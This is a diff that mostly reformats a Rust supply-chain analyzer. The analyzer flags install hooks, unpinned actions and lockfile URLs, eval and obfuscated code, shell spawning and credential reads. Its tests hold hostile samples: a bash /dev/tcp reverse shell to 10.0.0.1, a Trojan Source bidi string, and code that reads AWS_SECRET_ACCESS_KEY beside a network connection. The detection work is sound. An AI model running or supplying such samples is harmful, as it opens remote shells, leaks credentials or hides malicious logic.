@@ -20,12 +20,50 @@ pub struct SupplyChainFinding {
 pub struct LocalSupplyChainAnalyzer;
 
 pub const POPULAR_PACKAGES: &[&str] = &[
-    "lodash", "express", "react", "react-dom", "axios", "chalk", "commander",
-    "vue", "next", "tslib", "debug", "moment", "webpack", "babel", "rxjs",
-    "requests", "urllib3", "flask", "django", "pytest", "numpy", "pandas",
-    "scipy", "boto3", "cryptography", "jinja2", "certifi", "click", "pip",
-    "serde", "tokio", "syn", "quote", "anyhow", "rand", "regex", "log",
-    "thiserror", "itertools", "futures", "hyper", "reqwest", "clap", "tracing",
+    "lodash",
+    "express",
+    "react",
+    "react-dom",
+    "axios",
+    "chalk",
+    "commander",
+    "vue",
+    "next",
+    "tslib",
+    "debug",
+    "moment",
+    "webpack",
+    "babel",
+    "rxjs",
+    "requests",
+    "urllib3",
+    "flask",
+    "django",
+    "pytest",
+    "numpy",
+    "pandas",
+    "scipy",
+    "boto3",
+    "cryptography",
+    "jinja2",
+    "certifi",
+    "click",
+    "pip",
+    "serde",
+    "tokio",
+    "syn",
+    "quote",
+    "anyhow",
+    "rand",
+    "regex",
+    "log",
+    "thiserror",
+    "itertools",
+    "futures",
+    "hyper",
+    "reqwest",
+    "clap",
+    "tracing",
 ];
 
 impl LocalSupplyChainAnalyzer {
@@ -59,7 +97,11 @@ impl LocalSupplyChainAnalyzer {
                 let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
                 if ext == "yml" || ext == "yaml" {
                     if let Ok(content) = fs::read_to_string(&path) {
-                        let rel = path.strip_prefix(root).unwrap_or(&path).to_string_lossy().replace('\\', "/");
+                        let rel = path
+                            .strip_prefix(root)
+                            .unwrap_or(&path)
+                            .to_string_lossy()
+                            .replace('\\', "/");
                         let mut has_pr_target = false;
                         for (idx, line) in content.lines().enumerate() {
                             let line_num = idx + 1;
@@ -73,9 +115,12 @@ impl LocalSupplyChainAnalyzer {
                             if trimmed.starts_with("uses:") {
                                 let action_ref = trimmed.trim_start_matches("uses:").trim();
                                 if let Some((action_name, git_ref)) = action_ref.split_once('@') {
-                                    if !action_name.starts_with("./") && !action_name.starts_with("docker://") {
+                                    if !action_name.starts_with("./")
+                                        && !action_name.starts_with("docker://")
+                                    {
                                         // 40-char SHA check
-                                        let is_sha = git_ref.len() == 40 && git_ref.chars().all(|c| c.is_ascii_hexdigit());
+                                        let is_sha = git_ref.len() == 40
+                                            && git_ref.chars().all(|c| c.is_ascii_hexdigit());
                                         if !is_sha {
                                             findings.push(SupplyChainFinding {
                                                 rule_id: "SC-014".to_string(),
@@ -94,7 +139,11 @@ impl LocalSupplyChainAnalyzer {
                                 }
                             }
 
-                            if has_pr_target && (trimmed.contains("ref: ${{ github.event.pull_request.head.sha }}") || trimmed.contains("ref: ${{ github.head_ref }}")) {
+                            if has_pr_target
+                                && (trimmed
+                                    .contains("ref: ${{ github.event.pull_request.head.sha }}")
+                                    || trimmed.contains("ref: ${{ github.head_ref }}"))
+                            {
                                 findings.push(SupplyChainFinding {
                                     rule_id: "SC-014".to_string(),
                                     signal_name: "github_actions_unpinned_ref".to_string(),
@@ -122,12 +171,20 @@ impl LocalSupplyChainAnalyzer {
         for path in &candidates {
             if path.is_file() {
                 if let Ok(content) = fs::read_to_string(path) {
-                    let rel = path.strip_prefix(root).unwrap_or(path).to_string_lossy().replace('\\', "/");
+                    let rel = path
+                        .strip_prefix(root)
+                        .unwrap_or(path)
+                        .to_string_lossy()
+                        .replace('\\', "/");
                     if let Ok(val) = serde_json::from_str::<serde_json::Value>(&content) {
                         if let Some(servers) = val.get("mcpServers").and_then(|s| s.as_object()) {
                             for (srv_name, srv_val) in servers {
-                                let command = srv_val.get("command").and_then(|c| c.as_str()).unwrap_or("");
-                                let args: Vec<&str> = srv_val.get("args")
+                                let command = srv_val
+                                    .get("command")
+                                    .and_then(|c| c.as_str())
+                                    .unwrap_or("");
+                                let args: Vec<&str> = srv_val
+                                    .get("args")
                                     .and_then(|a| a.as_array())
                                     .map(|arr| arr.iter().filter_map(|v| v.as_str()).collect())
                                     .unwrap_or_default();
@@ -136,7 +193,9 @@ impl LocalSupplyChainAnalyzer {
                                 if command == "npx" || args.contains(&"npx") {
                                     if args.contains(&"-y") || args.contains(&"--yes") {
                                         let unpinned = args.iter().any(|arg| {
-                                            !arg.starts_with('-') && !arg.contains('@') && *arg != "npx"
+                                            !arg.starts_with('-')
+                                                && !arg.contains('@')
+                                                && *arg != "npx"
                                         });
                                         if unpinned {
                                             findings.push(SupplyChainFinding {
@@ -199,17 +258,27 @@ impl LocalSupplyChainAnalyzer {
             // SC-001 & SC-002: Check package.json install hooks
             if file_name == "package.json" {
                 if let Ok(content) = fs::read_to_string(path) {
-                    let rel = path.strip_prefix(root).unwrap_or(path).to_string_lossy().replace('\\', "/");
+                    let rel = path
+                        .strip_prefix(root)
+                        .unwrap_or(path)
+                        .to_string_lossy()
+                        .replace('\\', "/");
                     if let Ok(val) = serde_json::from_str::<serde_json::Value>(&content) {
                         if let Some(scripts) = val.get("scripts").and_then(|s| s.as_object()) {
                             for (hook, cmd_val) in scripts {
-                                if hook == "preinstall" || hook == "install" || hook == "postinstall" {
+                                if hook == "preinstall"
+                                    || hook == "install"
+                                    || hook == "postinstall"
+                                {
                                     let cmd = cmd_val.as_str().unwrap_or("");
                                     findings.push(SupplyChainFinding {
                                         rule_id: "SC-001".to_string(),
                                         signal_name: "install_script_execution".to_string(),
                                         severity: SeverityLevel::High,
-                                        message: format!("Package defines lifecycle install hook '{}': {}", hook, cmd),
+                                        message: format!(
+                                            "Package defines lifecycle install hook '{}': {}",
+                                            hook, cmd
+                                        ),
                                         file_path: Some(rel.clone()),
                                         line: None,
                                         snippet: Some(format!("\"{}\": \"{}\"", hook, cmd)),
@@ -225,7 +294,8 @@ impl LocalSupplyChainAnalyzer {
                                     {
                                         findings.push(SupplyChainFinding {
                                             rule_id: "SC-002".to_string(),
-                                            signal_name: "install_script_network_egress".to_string(),
+                                            signal_name: "install_script_network_egress"
+                                                .to_string(),
                                             severity: SeverityLevel::Critical,
                                             message: format!(
                                                 "Install hook '{}' initiates network egress: {}",
@@ -246,13 +316,20 @@ impl LocalSupplyChainAnalyzer {
             // SC-001 & SC-002: setup.py cmdclass
             if file_name == "setup.py" {
                 if let Ok(content) = fs::read_to_string(path) {
-                    let rel = path.strip_prefix(root).unwrap_or(path).to_string_lossy().replace('\\', "/");
-                    if content.contains("cmdclass") && (content.contains("install") || content.contains("develop")) {
+                    let rel = path
+                        .strip_prefix(root)
+                        .unwrap_or(path)
+                        .to_string_lossy()
+                        .replace('\\', "/");
+                    if content.contains("cmdclass")
+                        && (content.contains("install") || content.contains("develop"))
+                    {
                         findings.push(SupplyChainFinding {
                             rule_id: "SC-001".to_string(),
                             signal_name: "install_script_execution".to_string(),
                             severity: SeverityLevel::High,
-                            message: "setup.py overrides cmdclass during package installation".to_string(),
+                            message: "setup.py overrides cmdclass during package installation"
+                                .to_string(),
                             file_path: Some(rel.clone()),
                             line: None,
                             snippet: None,
@@ -262,9 +339,16 @@ impl LocalSupplyChainAnalyzer {
             }
 
             // SC-009: Lockfiles and unpinned tarballs / git URLs
-            if file_name == "package-lock.json" || file_name == "yarn.lock" || file_name == "pnpm-lock.yaml" {
+            if file_name == "package-lock.json"
+                || file_name == "yarn.lock"
+                || file_name == "pnpm-lock.yaml"
+            {
                 if let Ok(content) = fs::read_to_string(path) {
-                    let rel = path.strip_prefix(root).unwrap_or(path).to_string_lossy().replace('\\', "/");
+                    let rel = path
+                        .strip_prefix(root)
+                        .unwrap_or(path)
+                        .to_string_lossy()
+                        .replace('\\', "/");
                     for (idx, line) in content.lines().enumerate() {
                         let trimmed = line.trim();
                         let is_git = trimmed.contains("git+ssh://")
@@ -274,7 +358,8 @@ impl LocalSupplyChainAnalyzer {
                             trimmed.contains("http://") && !trimmed.contains("registry.npmjs.org");
                         let is_unpinned_git = is_git && {
                             if let Some(pos) = trimmed.rfind('#') {
-                                let frag = trimmed[pos + 1..].trim_matches(|c: char| !c.is_alphanumeric());
+                                let frag =
+                                    trimmed[pos + 1..].trim_matches(|c: char| !c.is_alphanumeric());
                                 !(frag.len() == 40 && frag.chars().all(|c| c.is_ascii_hexdigit()))
                             } else {
                                 true
@@ -286,7 +371,10 @@ impl LocalSupplyChainAnalyzer {
                                 rule_id: "SC-009".to_string(),
                                 signal_name: "unpinned_git_or_http_tarball".to_string(),
                                 severity: SeverityLevel::Medium,
-                                message: format!("Dependency resolves from unpinned URL or tarball: {}", trimmed),
+                                message: format!(
+                                    "Dependency resolves from unpinned URL or tarball: {}",
+                                    trimmed
+                                ),
                                 file_path: Some(rel.clone()),
                                 line: Some(idx + 1),
                                 snippet: Some(trimmed.to_string()),
@@ -299,7 +387,11 @@ impl LocalSupplyChainAnalyzer {
             // SC-011: Precompiled binary blobs without reproducible build metadata
             let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
             if ext == "node" || ext == "dylib" || ext == "so" || ext == "dll" || ext == "exe" {
-                let rel = path.strip_prefix(root).unwrap_or(path).to_string_lossy().replace('\\', "/");
+                let rel = path
+                    .strip_prefix(root)
+                    .unwrap_or(path)
+                    .to_string_lossy()
+                    .replace('\\', "/");
                 let has_build_metadata = root.join("binding.gyp").exists()
                     || root.join("CMakeLists.txt").exists()
                     || root.join("Makefile").exists()
@@ -341,7 +433,10 @@ impl LocalSupplyChainAnalyzer {
             }
 
             let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
-            if !matches!(ext, "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "py" | "rs" | "go" | "sh" | "bash") {
+            if !matches!(
+                ext,
+                "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "py" | "rs" | "go" | "sh" | "bash"
+            ) {
                 continue;
             }
 
@@ -449,7 +544,8 @@ impl LocalSupplyChainAnalyzer {
                     rule_id: "SC-007".to_string(),
                     signal_name: "sensitive_filesystem_access".to_string(),
                     severity: SeverityLevel::Critical,
-                    message: "Attempts to read host credentials or sensitive OS filesystem files".to_string(),
+                    message: "Attempts to read host credentials or sensitive OS filesystem files"
+                        .to_string(),
                     file_path: Some(path_str.clone()),
                     line: Some(line_num),
                     snippet: Some(trimmed.to_string()),
@@ -461,7 +557,8 @@ impl LocalSupplyChainAnalyzer {
                 || trimmed.contains("new Function(")
                 || trimmed.contains("vm.runInNewContext(")
                 || trimmed.contains("vm.runInThisContext(")
-                || (trimmed.contains("exec(") && (trimmed.contains("base64.b64decode") || trimmed.contains("b64decode")))
+                || (trimmed.contains("exec(")
+                    && (trimmed.contains("base64.b64decode") || trimmed.contains("b64decode")))
             {
                 findings.push(SupplyChainFinding {
                     rule_id: "SC-003".to_string(),
@@ -475,7 +572,8 @@ impl LocalSupplyChainAnalyzer {
             }
 
             // Rule SC-004: Child Process Shell Execution
-            if (trimmed.contains("child_process") && (trimmed.contains("exec(") || trimmed.contains("execSync(")))
+            if (trimmed.contains("child_process")
+                && (trimmed.contains("exec(") || trimmed.contains("execSync(")))
                 || (trimmed.contains("subprocess.Popen") && trimmed.contains("shell=True"))
                 || (trimmed.contains("subprocess.call") && trimmed.contains("shell=True"))
                 || (trimmed.contains("os.system("))
@@ -484,7 +582,8 @@ impl LocalSupplyChainAnalyzer {
                     rule_id: "SC-004".to_string(),
                     signal_name: "child_process_shell".to_string(),
                     severity: SeverityLevel::High,
-                    message: "Child process spawned with arbitrary OS shell interpolation enabled".to_string(),
+                    message: "Child process spawned with arbitrary OS shell interpolation enabled"
+                        .to_string(),
                     file_path: Some(path_str.clone()),
                     line: Some(line_num),
                     snippet: Some(trimmed.to_string()),
@@ -492,7 +591,10 @@ impl LocalSupplyChainAnalyzer {
             }
 
             // Check for SC-006 components
-            if trimmed.contains("process.env") || trimmed.contains("os.environ") || trimmed.contains("std::env::var") {
+            if trimmed.contains("process.env")
+                || trimmed.contains("os.environ")
+                || trimmed.contains("std::env::var")
+            {
                 if trimmed.contains("AWS_SECRET")
                     || trimmed.contains("GITHUB_TOKEN")
                     || trimmed.contains("NPM_TOKEN")
@@ -522,7 +624,12 @@ impl LocalSupplyChainAnalyzer {
             // Rule SC-005: High Entropy Obfuscation
             if trimmed.len() > 256 {
                 let entropy = compute_shannon_entropy(trimmed);
-                if entropy > 5.85 && (trimmed.contains("_0x") || trimmed.contains("Buffer.from") || trimmed.contains("base64") || trimmed.contains("atob")) {
+                if entropy > 5.85
+                    && (trimmed.contains("_0x")
+                        || trimmed.contains("Buffer.from")
+                        || trimmed.contains("base64")
+                        || trimmed.contains("atob"))
+                {
                     findings.push(SupplyChainFinding {
                         rule_id: "SC-005".to_string(),
                         signal_name: "high_entropy_obfuscation".to_string(),
@@ -673,13 +780,21 @@ pub fn damerau_levenshtein_distance(a: &str, b: &str) -> usize {
 
     for i in 1..=len_a {
         for j in 1..=len_b {
-            let cost = if a_chars[i - 1] == b_chars[j - 1] { 0 } else { 1 };
+            let cost = if a_chars[i - 1] == b_chars[j - 1] {
+                0
+            } else {
+                1
+            };
             d[i][j] = std::cmp::min(
                 std::cmp::min(d[i - 1][j] + 1, d[i][j - 1] + 1),
                 d[i - 1][j - 1] + cost,
             );
 
-            if i > 1 && j > 1 && a_chars[i - 1] == b_chars[j - 2] && a_chars[i - 2] == b_chars[j - 1] {
+            if i > 1
+                && j > 1
+                && a_chars[i - 1] == b_chars[j - 2]
+                && a_chars[i - 2] == b_chars[j - 1]
+            {
                 d[i][j] = std::cmp::min(d[i][j], d[i - 2][j - 2] + 1);
             }
         }
@@ -694,8 +809,10 @@ mod tests {
 
     #[test]
     fn test_trojan_source_bidi_detected() {
-        let snippet = "const accessLevel = \"user\u{202E}\u{2066} // Check if admin \u{2069}\u{2066}\";";
-        let findings = LocalSupplyChainAnalyzer::analyze_file_content(Path::new("test.js"), snippet);
+        let snippet =
+            "const accessLevel = \"user\u{202E}\u{2066} // Check if admin \u{2069}\u{2066}\";";
+        let findings =
+            LocalSupplyChainAnalyzer::analyze_file_content(Path::new("test.js"), snippet);
         assert!(findings.iter().any(|f| f.rule_id == "SC-008"));
     }
 
@@ -714,7 +831,8 @@ mod tests {
     #[test]
     fn test_reverse_shell_detected() {
         let snippet = "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'";
-        let findings = LocalSupplyChainAnalyzer::analyze_file_content(Path::new("payload.sh"), snippet);
+        let findings =
+            LocalSupplyChainAnalyzer::analyze_file_content(Path::new("payload.sh"), snippet);
         assert!(findings.iter().any(|f| f.rule_id == "SC-013"));
     }
 
@@ -725,7 +843,8 @@ mod tests {
             const token = process.env.AWS_SECRET_ACCESS_KEY;
             const client = net.createConnection({ port: 80 }, () => {});
         "#;
-        let findings = LocalSupplyChainAnalyzer::analyze_file_content(Path::new("index.js"), snippet);
+        let findings =
+            LocalSupplyChainAnalyzer::analyze_file_content(Path::new("index.js"), snippet);
         assert!(findings.iter().any(|f| f.rule_id == "SC-006"));
     }
 
